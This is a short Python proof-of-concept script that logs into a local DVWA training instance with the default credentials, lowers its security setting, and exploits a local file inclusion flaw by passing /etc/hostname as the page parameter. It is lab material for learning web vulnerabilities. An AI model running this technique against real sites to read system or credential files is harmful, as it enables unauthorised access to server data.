import re
import requests
from urllib.parse import urljoin

BASE_URL = "http://127.0.0.1:8080"
SESSION = requests.Session()

# Log in to DVWA
login_url = urljoin(BASE_URL, "/login.php")
response = SESSION.get(login_url)

token = re.search(
    r"name=['\"]user_token['\"] value=['\"]([^'\"]+)['\"]",
    response.text
)

if not token:
    print("Could not find DVWA login token.")
    raise SystemExit(1)

login_response = SESSION.post(login_url, data={
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": token.group(1)
})

if "Logout" not in login_response.text:
    print("Authentication failed.")
    raise SystemExit(1)

# Set DVWA security to Low
SESSION.cookies.set("security", "low")

# Request the local hostname file
target_url = urljoin(BASE_URL, "/vulnerabilities/fi/")
response = SESSION.get(
    target_url,
    params={"page": "/etc/hostname"}
)

print("Local File Inclusion PoC")
print("========================")
print(f"HTTP Status: {response.status_code}")

# Check for a hostname-like value in the response
hostname_pattern = r"(?m)^[a-zA-Z0-9][a-zA-Z0-9.-]{0,252}$"

matches = re.findall(hostname_pattern, response.text)

if response.status_code == 200 and matches:
    print("LFI confirmed: a hostname-like value was disclosed.")
    print(f"Disclosed value: {matches[0]}")
else:
    print("LFI not confirmed. Review the response.")